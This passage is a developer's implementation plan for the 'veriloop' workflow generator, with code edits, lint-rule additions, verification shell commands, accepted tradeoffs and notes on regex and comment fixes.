    "instruction": "This change touches the DB: run the Supabase security advisor (MCP get_advisors, type security) and report pass (no new WARN/ERROR) or fail",
    "areaKeywords": ["db", "schema", "migration", "supabase", "rls", "sql"] }] }
EOF
rm -rf $S/b1-bundle
node $V/scripts/generate.mjs --repo /Users/benjaminli/my_projects/Torevan --commands $S/torevan-commands.json --out $S/b1-bundle --interview $S/interview-sample.json
grep -c '"crossModel": false' $S/b1-bundle/.claude/workflows/torevan-dev-loop.js   # → 1
grep -c 'supabase-advisor' $S/b1-bundle/.claude/workflows/torevan-dev-loop.js      # → ≥1
grep -c '"matchmaking"' $S/b1-bundle/.claude/workflows/torevan-dev-loop.js         # → ≥1
node $V/scripts/generate.mjs --repo /Users/benjaminli/my_projects/Torevan --commands $S/torevan-commands.json --out $S/b1-bundle
grep -c '"cross_model": false' $S/b1-bundle/.claude/veriloop/veriloop-manifest.json # → 1 (survived re-run WITHOUT --interview)
```

### B2 (MINOR) — make `baseBranch` required from the implement agent

**File:** `scripts/templates/dev-loop.template.js`
ANCHOR:
```js
  { label: 'implement', phase: 'Implement', schema: { ...IMPL_SCHEMA, properties: { ...IMPL_SCHEMA.properties, baseBranch: { type: 'string' } }, required: [...IMPL_SCHEMA.required] } },
```
REPLACE `required: [...IMPL_SCHEMA.required]` with `required: [...IMPL_SCHEMA.required, 'baseBranch']`.
Keep the existing `impl.baseBranch || 'main'` fallback as-is (belt and suspenders).

### B3 (MINOR) — plan phase reads baseline overrides too

**File:** `scripts/templates/dev-loop.template.js`
ANCHOR:
```js
    `Read \`$REPO/${CONSTITUTION}\` and the baseline reviewer persona at \`$REPO/${VERILOOP.experts[0].file}\`.\n` +
```
REPLACE WITH:
```js
    `Read \`$REPO/${CONSTITUTION}\` and the baseline reviewer persona at \`$REPO/${VERILOOP.experts[0].file}\` (plus \`$REPO/${VERILOOP.experts[0].overrides}\` if it exists — hand-authored overrides win).\n` +
```

### B4 (MINOR) — truthful constitution "rule ownership" starter

**File:** `scripts/lib/render.mjs`, function `renderConstitution`.
- ANCHOR the header line ``### Rule ownership (every rule owned by exactly one expert; no orphan rules)`` and REPLACE the ownership section with:
```
### Rule ownership — target state
Every rule must be owned by exactly ONE expert, and every expert must own at least a
few rules (no orphan rules, no jobless experts). The starter rules are pre-assigned
below; assign each TODO as you replace it — if a rule has no plausible owner in this
roster, either the roster is missing an expert or the rule doesn't belong here.
```
followed by the existing roster list.
- In the rules themselves: append ` _(owner: \`code-review\`)_` to rules 1, 4 and 5; change rule 2's TODO line to end with ` _(owner: assign — usually \`code-review\` or \`drift\`)_`; change rule 3's TODO line to end with ` _(owner: the \`security\` expert; if this roster has none, delete this rule or revisit the roster)_`.

VERIFY: regenerate the catan bundle fresh (delete `$S/b4-catan` first, `--out $S/b4-catan`) and read the constitution: rule 3 carries the security note; header says "target state".

### B5 (MINOR) — maturin worktree note keyed on polyglot, not the build string

**File:** `scripts/generate.mjs`, in `buildDepsSetup`.
ANCHOR:
```js
    if (build && /maturin/.test(build)) s += ` This repo ships a compiled extension — also run \`${build}\` in the worktree to build it.`;
```
REPLACE WITH:
```js
    if ((cj.polyglot || []).some((p) => /rust|maturin/i.test(p))) {
      s += ` This repo ships a compiled (Rust/maturin) extension — also run \`${build && /maturin|rust/.test(build) ? build : 'maturin develop --release'}\` in the worktree so the extension is importable.`;
    }
```

VERIFY: regenerate catan bundle → its workflow's `depsSetup` mentions the compiled extension and `make rust-build`.

### B6 (MAJOR) — lint-bundle: catch harness-forbidden APIs

**File:** `scripts/lint-bundle.mjs` — in the per-workflow-file loop (section 3), after the
syntax check, add:
```js
    // the Workflow harness forbids these at runtime; they are syntax-valid, so
    // node --check alone gives false confidence
    const FORBIDDEN = [
      [/\bDate\.now\s*\(/, 'Date.now()'],
      [/\bnew\s+Date\s*\(/, 'new Date()'],
      [/\bMath\.random\s*\(/, 'Math.random()'],
      [/\bprocess\.(env|argv|exit|cwd)\b/, 'process.*'],
      [/\brequire\s*\(/, 'require()'],
      [/^\s*import\s+[\w{*]/m, 'import statement'],
    ];
    for (const [re, label] of FORBIDDEN) {
      if (re.test(src)) fail(`workflow ${n} — uses harness-forbidden API: ${label}`);
    }
    if (!FORBIDDEN.some(([re]) => re.test(src))) ok(`workflow ${n} — no harness-forbidden APIs`);
```

### B7 (MINOR) — lint-bundle: config↔files completeness

**File:** `scripts/lint-bundle.mjs` — in the manifest section (5), after the existing
roster/gate checks, add:
```js
      // every roster expert's persona file must exist on disk
      for (const e of m.roster || []) {
        if (!e.file) continue;
        if (existsSync(join(args.bundle, e.file))) ok(`roster persona present: ${e.file}`);
        else fail(`roster expert '${e.key}' persona missing: ${e.file}`);
      }
      // the workflow's wired gate must equal the manifest's gate commands
      const wfDirX = join(args.bundle, '.claude/workflows');
      const wfX = (listDir(wfDirX) || []).find((x) => x.endsWith('-dev-loop.js'));
      if (wfX && m.gate_commands) {
        const srcX = readFileSync(join(wfDirX, wfX), 'utf8');
        const gm = srcX.match(/"gate":\s*\[([^\]]*)\]/);
        const wired = gm ? [...gm[1].matchAll(/"cmd":\s*"((?:[^"\\]|\\.)*)"/g)].map((x) => JSON.parse(`"${x[1]}"`)) : [];
        const manifest = m.gate_commands.map((c) => c.cmd);
        if (JSON.stringify(wired) === JSON.stringify(manifest)) ok('workflow gate matches manifest gate_commands');
        else fail(`gate mismatch — workflow [${wired.join(' | ')}] vs manifest [${manifest.join(' | ')}]`);
      }
```
(Note: `m.roster[].file` exists only after B1 step 5; older manifests skip that check via the `if (!e.file) continue`.)

### B8 (MINOR) — Windows absolute-path regex

**File:** `scripts/lint-bundle.mjs`
ANCHOR: `const ABS = /(\/Users\/|\/home\/[a-z]|[A-Z]:\\\\)/;`
REPLACE: `const ABS = /(\/Users\/|\/home\/[a-z]|[A-Z]:[\\/])/;`

VERIFY (B6–B8 together): regenerate BOTH bundles fresh into `$S/final-torevan` and
`$S/final-catan` (delete first), then
`node $V/scripts/lint-bundle.mjs --bundle $S/final-torevan` and `…--bundle $S/final-catan`
→ both exit 0, and the output includes the new lines `no harness-forbidden APIs`,
`roster persona present: …`, `workflow gate matches manifest gate_commands`.

### B9 (doc-truth) — README + SKILL claim corrections

**File: `README.md`** — make these edits:
1. In "The emitted loop's shape", append: cross-model is on by default and can be
   disabled via the interview (`cross_model: false`).
2. Add a short subsection **"Repo-specific gate checks (`extra_checks`)"** under the
   pipeline table or near the loop-shape section: explains that non-portable real
   checks (the worked example: Torevan's Supabase security advisor on DB-touching
   changes) are restored via the interview's `extra_checks` and run inside the gate's
   checks agent; note plainly that without an `extra_checks` entry the generated loop
   does NOT reproduce such repo-specific checks from a hand-built loop.
3. In the Verify row / safe-list section, add one sentence: verify runs with `CI=1`
   (deterministic, non-watch), which can make warnings-as-errors toolchains verify
   red even when locally green — the stored tail shows the real output.
4. In "Repo layout", add lines for `scripts/selftest.mjs` (deterministic self-test)
   and `fixtures/` (fixture repos for the self-test) — Workstream A creates them.
5. In "Status", change to: spine complete and self-tested; interview answers persist
   in the manifest and shape the loop (cross-model, risk areas, extra checks).

**File: `skills/veriloop/SKILL.md`** — besides the Phase-5 rewrite in B1:
1. Phase 9: replace the claim that the manifest records "interview answers" implicitly —
   state answers come from `--interview` and persist/merge across re-runs.
2. Phase 2: add the one-pass guidance: run verify ONCE with the full `--include` set;
   a later narrower run resets skipped commands' verification (by design, A6).
3. Phase 8: mention the linter now also rejects harness-forbidden APIs and
   config↔file mismatches.

VERIFY: `grep -n "extra_checks" $V/README.md $V/skills/veriloop/SKILL.md` → hits in both;
`grep -n "interview.json" $V/skills/veriloop/SKILL.md` → ≥1 hit.

---

# Integration verification (run after BOTH workstreams; any failure = not done)

```bash
V=/Users/benjaminli/my_projects/veriloop
S=/private/tmp/claude-501/-Users-benjaminli-my-projects/476843bf-8cc4-42aa-8e82-65478cfdafa5/scratchpad

# 0. every script still parses
for f in $V/scripts/*.mjs $V/scripts/lib/*.mjs; do node --check "$f" || echo "SYNTAX FAIL: $f"; done

# 1. deterministic selftest — all assertions ok, exit 0
node $V/scripts/selftest.mjs

# 2. re-detect both real repos (fresh files)
node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/Torevan     --out $S/torevan-commands.json
node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --out $S/catan-commands.json
# expectations:
#  torevan: has_ui true; test_single == "(cd apps/web && npx vitest run <file>)";
#           e2e == "npm run test:e2e -w @torevan/web"; typecheck/lint/test/build CI✓
#  catan:   has_ui false; test == "make test-unit"; format has mutates:true; e2e is the integration pytest line

# 3. verify SAFE-tier only on both (NO --include on real repos)
node $V/scripts/verify.mjs --repo /Users/benjaminli/my_projects/Torevan     --commands $S/torevan-commands.json --timeout 240
node $V/scripts/verify.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --commands $S/catan-commands.json  --timeout 240
# expectations: torevan typecheck+lint PASS, format:check FAIL (pre-existing);
#               catan typecheck PASS, lint FAIL (pre-existing B904), make format SKIPPED (mutates);
#               `grep -c $'\x1b' <file> || true` on both files → 0 (ANSI stripped)
\x1b' on both files → 0 (ANSI stripped)

# 4. regenerate + lint both bundles (fresh dirs)
rm -rf $S/final-torevan $S/final-catan
node $V/scripts/generate.mjs --repo /Users/benjaminli/my_projects/Torevan     --commands $S/torevan-commands.json --out $S/final-torevan --interview $S/interview-sample.json
node $V/scripts/generate.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --commands $S/catan-commands.json  --out $S/final-catan
node $V/scripts/lint-bundle.mjs --bundle $S/final-torevan --name torevan   # exit 0
node $V/scripts/lint-bundle.mjs --bundle $S/final-catan  --name catan      # exit 0

# 5. interview persistence: re-run torevan generate WITHOUT --interview; answers survive
node $V/scripts/generate.mjs --repo /Users/benjaminli/my_projects/Torevan --commands $S/torevan-commands.json --out $S/final-torevan
grep -c '"cross_model": false' $S/final-torevan/.claude/veriloop/veriloop-manifest.json  # → 1

# 6. portability + placeholder re-check on final bundles
grep -rn "/Users/" $S/final-torevan/.claude $S/final-catan/.claude | grep -v ".backups" | wc -l  # → 0
```

# Accepted tradeoffs (documented; NO code change — do not "fix" these)

1. **`CI=1` during verify** can flip warnings-as-errors toolchains red. Kept for
   deterministic termination; documented in verify.mjs comment + README (A12/B9).
2. **Rejecting every `$`/backtick in CI-adopted commands** (A1) may reject a rare
   legitimate CI line using an env var. Safe-side by design: a rejected line just
   means "no command detected", never a wrong/dangerous command.
3. **mypy fallback scans `.`** when no `src/` exists — may traverse venvs. Accepted:
   mypy is safe-tier read-only; a wrong-scope result shows up as an unverified
   command, not a wrong gate.
4. **Verify semantics are last-run-wins** (A6): a narrower re-run resets skipped
   commands' verification. This is the price of a never-contradictory audit record;
   the guidance is to verify once with the full include set.
5. **Negation workspace patterns (`!…`) are skipped** in A4's expansion — acceptable
   for scope discovery (over-inclusion just adds scope entries).

## Implementation notes

- **A4 (Workstream A):** The plan's `expandWorkspaces` JSDoc header literally contained
  the substring `a/*/*`, whose `*/` sequence prematurely closes a `/** … */` block
  comment and made `node --check` fail (`SyntaxError: Unexpected token '*'`). Fixed by
  emitting the same explanatory text as a line comment instead:
  `// Expand workspace globs: literal dirs, single \`*\`, nested \`a/x/y\`, and \`**\` (depth<=3).`
  No behavioral change — the function body is exactly as specified.
- **A3 (Workstream A):** VERIFY grep (`grep '"e2e"' -A 2 | grep 'npm run test:e2e -w @torevan/web'`)
  yields 2 matches, not the stated 1, because the identical (correct) npm form now
  appears in both `commands.e2e` and `scopes[].commands.e2e` (both route through the new
  `scopeRun`). The required semantic — npm behavior unchanged / correct string — holds.

---

## Implementation notes

- **B8 (Workstream B).** The plan's exact replacement regex
  `const ABS = /(\/Users\/|\/home\/[a-z]|[A-Z]:[\\/])/;` fails its own VERIFY
  (both bundles exit 0). The added `[A-Z]:[\\/]` alternative false-positives on
  pre-existing template prompt strings such as `PLAN:\n` and `BLOCKERS:\n`, where an
  uppercase letter + colon is immediately followed by the `\` of a `\n` escape
  (e.g. `N:\`). Deviated minimally by adding a word boundary:
  `const ABS = /(\/Users\/|\/home\/[a-z]|\b[A-Z]:[\\/])/;`. This preserves the
  plan's intent (catch Windows absolute paths written with either `\` or `/`, e.g.
  `C:\Users` and `C:/Users`) while rejecting the single-letter-drive false
  positives — a real drive letter is a single letter at a token boundary, so the
  `\b` is satisfied by real paths but not by `…AN:` inside `PLAN`. Both bundles now
  lint at exit 0.
